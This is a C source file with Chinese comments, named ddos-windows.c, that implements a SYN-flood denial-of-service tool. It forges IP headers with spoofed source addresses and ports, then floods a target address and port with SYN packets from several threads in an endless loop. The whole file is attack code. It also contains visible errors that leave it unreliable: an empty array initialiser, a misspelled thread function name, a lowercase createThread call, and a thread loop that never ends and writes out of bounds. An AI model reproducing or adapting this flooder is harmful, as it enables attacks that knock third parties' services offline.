//gcc ddos-windows.c -lws2_32
#include <windows.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib,"WS2_32.LIB") 

typedef struct tag_ip_Header//ip首部 
{ 
unsigned char h_verlen;//4位手部长度，和4位IP版本号 
unsigned char tos;//8位类型服务 
unsigned short total_len;//16位总长度 
unsigned short ident;//16位标志 
unsigned short frag_and_flags;//3位标志位（如SYN,ACK,等等) 
unsigned char ttl;//8位生存时间 
unsigned char proto;//8位协议 
unsigned short checksum;//ip手部效验和 
unsigned int SourceIP;//伪造IP地址 
unsigned int DestIP;//攻击的ip地址 
}IPHEADER; 

typedef struct tag_tcp_Header 
{ 
USHORT th_sport;//伪造端口 
USHORT th_dport;//攻击端口 
unsigned int th_seq;//32位系列号 
unsigned int th_ack;//32位确认号 
unsigned char th_lenres;//4位首布长度，6位保留字 
unsigned char th_flag;//6位标志位 
USHORT th_win;//16位窗口大小 
USHORT th_sum;//16位效验和 
USHORT th_urp;// 
}TCPHEADER; 

typedef struct tag_tsd_Header 
{ 
unsigned long saddr;//伪造地址 
unsigned long daddr;//攻击地址 
char mbz;// 
char ptcl;//协议类型 
unsigned short tcpl;//TCP长度 
}TSDHEADER; 

DWORD WINAPI Start(void); 
HANDLE hFind[10]; 

//计算效验和 
USHORT checksum(USHORT *buffer,int size) 
{ 
unsigned long check=0; 
while(size>1) 
{ 
check+=*buffer++; 
size -=sizeof(USHORT); 
} 
if(size) 
{ 
check += *(USHORT*)buffer; 
} 
check = (check >>16) + (check & 0xffff); 
check += (check >>16); 
return (USHORT)(~check); 
} 
//攻击线程 
DWORD WINAPI Statr(void) 
{ 
SOCKET sock; 
WSADATA WSAData; 
SOCKADDR_IN syn_in; 
IPHEADER ipHeader; 
TCPHEADER tcpHeader; 
TSDHEADER psdHeader; 
const char *addr = "127.0.0.1";//攻击的IP地址 
int port = 135;//要攻击的端口 
if(WSAStartup(MAKEWORD(2,2),&WSAData)) 
{ 
return false; 
} 
if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET) 
{ 
return false; 
} 
BOOL flag=true; 
if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag))==SOCKET_ERROR) 
{ 
return false; 
} 
int Time =888; 
if(setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&Time,sizeof(Time))==SOCKET_ERROR) 
{ 
return false; 
} 
syn_in.sin_family = AF_INET; 
syn_in.sin_port = htons(port); 
syn_in.sin_addr.S_un.S_addr = inet_addr(addr); 
while(TRUE) 
{ 
//填充IP首部 
ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
ipHeader.tos=0; 
ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
ipHeader.ident=1; 
ipHeader.frag_and_flags=0; 
ipHeader.ttl=(unsigned char)GetTickCount()%514+620; 
ipHeader.proto=IPPROTO_TCP; 
ipHeader.checksum=0; 
ipHeader.SourceIP=htonl(GetTickCount()*1986); 
ipHeader.DestIP=inet_addr(addr); 
//填充Tcp首部 
int SourcePort =GetTickCount()*1986%514; 
tcpHeader.th_dport=htons(port); 
tcpHeader.th_sport=htons(SourcePort); 
tcpHeader.th_seq=htonl(0x12345678); 
tcpHeader.th_ack=0; 
tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
tcpHeader.th_flag=2; 
tcpHeader.th_win=htons(620); 
tcpHeader.th_urp=0; 
tcpHeader.th_sum=0; 
//填充TCP伪首部用来计算TCP头部的效验和 
psdHeader.saddr=ipHeader.SourceIP; 
psdHeader.daddr=ipHeader.DestIP; 
psdHeader.mbz=0; 
psdHeader.ptcl=IPPROTO_TCP; 
psdHeader.tcpl=htons(sizeof(tcpHeader)); 

//计算校验和 
char SendBuff[100]=; 
memcpy(SendBuff, &psdHeader, sizeof(psdHeader)); 
memcpy(SendBuff+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
tcpHeader.th_sum=checksum((USHORT *)SendBuff,sizeof(psdHeader)+sizeof(tcpHeader)); 
memcpy(SendBuff, &ipHeader, sizeof(ipHeader)); 
memcpy(SendBuff+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 

//发送数据包 
int Syn=sendto(sock, SendBuff, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&syn_in, sizeof(syn_in)); 
if(Syn==SOCKET_ERROR) 
{ 
return false; 
} 
} 
closesocket(sock); 
WSACleanup(); 
return true; 
} 

int APIENTRY WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, 
int nCmdShow) 
{ //启动线程，10，大家可以自己改 
for(int i=0;i<10;i++) 
{ 
hFind[i-1]=createThread(NULL,0,(LPTHREAD_START_ROUTINE)Statr,0,0,NULL); 
i--; 
} 
return 0; 
} 

